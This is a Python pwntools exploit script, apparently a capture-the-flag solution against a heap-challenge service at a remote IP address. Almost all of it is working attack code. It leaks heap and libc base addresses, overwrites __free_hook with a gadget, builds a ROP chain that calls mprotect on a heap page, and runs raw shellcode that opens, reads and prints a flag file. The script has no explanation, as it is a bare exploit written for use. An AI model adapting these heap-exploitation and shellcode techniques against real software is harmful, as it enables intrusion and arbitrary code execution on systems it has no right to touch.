from pwn import *
context.log_level="debug"
context.arch="amd64"
# import msg_pb2

# sh = process('./pwn')
sh=remote("123.56.116.45", 43503)

def cmd(p):
    sh.sendafter(b'me now: ',p)

for i in range(10):
    payload=b'\x08\x02\x10'
    payload+=(i*2).to_bytes(1, "little")
    payload+=b'\x18\xe0\x03"&nihaowoshilsjdflajslkjfoaijslfjawlejfl' #0
    cmd(payload)
#10
for i in range(9):
    payload=b'\x08\x08\x10'
    payload+=(i*2).to_bytes(1, "little")
    payload+=b'\x18\xe0\x03"&nihaowoshilsjdflajslkjfoaijslfjawlejfl' #0
    cmd(payload)
# payload=b'\x08\x08\x10\x00\x18\xe0\x03"&nihaowoshilsjdflajslkjfoaijslfjawlejfl'


payload=b'\x08\x06\x10\x0c\x18\xe0\x03"&nihaowoshilsjdflajslkjfoaijslfjawlejfl' #leak
cmd(payload)

leak_heap=u64(sh.recvuntil(b'\x55')[-6:].ljust(8,b'\x00'))
heapbase=(leak_heap>>12)<<12
success("heapbase:"+hex(heapbase))

payload=b'\x08\x06\x10\x10\x18\xe0\x03"&nihaowoshilsjdflajslkjfoaijslfjawlejfl' #leak
cmd(payload)

leak_libc=u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libcbase=leak_libc-0x1ecbe0
success("libcbase:"+hex(libcbase))
libc=ELF("./libc-2.31.so")
libc.address=libcbase
free_hook=libc.sym['__free_hook']
mprotect=libc.sym['mprotect']
# setcontext=0x7f64615faf5d
magic=0x0000000000151990+libcbase # mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
rdx_to_rsp=0x000000000005b4d0+libcbase
pop_rdi=0x0000000000023b6a+libcbase
pop_rsi=0x000000000002601f+libcbase
pop_rdx=0x0000000000142c92+libcbase
pop_r12_r13=0x0000000000025b9b+libcbase

payload=b'\x08\x04\x10\x0c\x18\xe0\x03"\x08'+p64(free_hook)
cmd(payload)



for i in range(11,13):
    payload=b'\x08\x02\x10'
    payload+=(i*2).to_bytes(1, "little")
    payload+=b'\x18\xe0\x03"\x08'+p64(magic) #0
    cmd(payload)

ropchan_pos=heapbase+0x4a0 #1
shellcode_pos=heapbase+0x620 #2
ROPchan=flat(
    {
        0x8:ropchan_pos+0x10,
        0x10:{
            0x0:pop_rdi,
            0x8:shellcode_pos&~0xfff,
            0x10:pop_r12_r13,
            0x18:0xdeadbeef,
            0x20:rdx_to_rsp,
            0x28:[
                pop_rsi,
                0x1000,
                pop_rdx,
                7,
                mprotect,
                shellcode_pos   
            ]
        },
    }
)
payload=b'\x08\x04\x10\x02\x18\xe0\x03"h'+ROPchan
cmd(payload)

payload=b'\x08\x04\x10\x04\x18\xe0\x03",'+b'hflagH\x89\xe71\xd21\xf6j\x02X\x0f\x05H\x89\xc71\xc0j`ZH\x89\xe6\x0f\x05j\x01_j`ZH\x89\xe6j\x01X\x0f\x05'
cmd(payload)

payload=b'\x08\x08\x10\x02\x18\xe0\x03"&nihaowoshilsjdflajslkjfoaijslfjawlejfl'
cmd(payload)

# gdb.attach(sh)
sh.interactive()